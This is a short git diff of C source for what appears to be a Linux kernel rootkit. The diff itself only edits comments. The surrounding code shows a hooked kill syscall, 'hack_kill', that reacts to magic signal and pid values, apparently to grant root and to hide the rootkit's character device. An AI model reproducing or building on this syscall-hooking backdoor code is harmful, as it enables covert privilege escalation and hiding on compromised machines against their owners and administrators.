@@ -6,9 +6,9 @@
 #include "kite_hook.h"
 #include "root_setter.h"
 
-
+/*A function to replace the kill syscall, applied when hooking the function*/
 #ifdef PTREGS_SYSCALL_STUB
-static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
+static asmlinkage long hack_kill(const struct pt_regs *regs){
     int sig = regs->si;
     int pid = regs->di;
     if ((sig == 64) && (pid == 1))
@@ -27,7 +27,7 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         }
     }
     else if ((sig == 64) && (pid == 2)){
-        // hide chardev quickly
+        // ***hide chardev quickly
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
